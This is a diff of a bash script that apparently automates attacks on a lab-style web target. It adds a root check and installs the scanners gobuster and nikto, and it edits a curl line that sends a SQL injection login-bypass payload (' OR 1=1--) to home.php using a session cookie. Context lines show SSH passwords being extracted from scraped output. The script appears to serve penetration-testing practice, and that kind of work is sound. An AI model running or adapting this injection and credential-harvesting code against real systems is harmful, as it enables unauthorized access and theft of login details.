@@ -1,4 +1,17 @@
 #!/bin/bash
+#ROOT CHECK
+if [ "$EUID" -ne 0 ]
+  then echo "Please run as root"
+  exit
+fi
+# INSTALLATION
+if ! command -v gobuster && ! command -v nikto && ! command -v gnome-terminal &> /dev/null
+	then
+		echo "Missing dependecies, proceeding to install"
+		apt-get update
+		apt-get install gobuster nikto gnome-terminal -y
+	exit
+fi
 # FUNCTIONS
 
 ip4_to_int() {
@@ -82,7 +95,7 @@ SSHPASS=`echo $CURLOUTPUT | awk '{print $3}'`
 
 echo ""
 echo "############ SQL Injection ############"
-curl -b 'PHPSESSID='$COOKIE http://$WEB_IP/home.php?username=%27%20OR%201=1--%27
+curl -b $COOKIE http://$WEB_IP/home.php?username=%27%20OR%201=1--%27
 echo ""
 
 echo "===================================================="
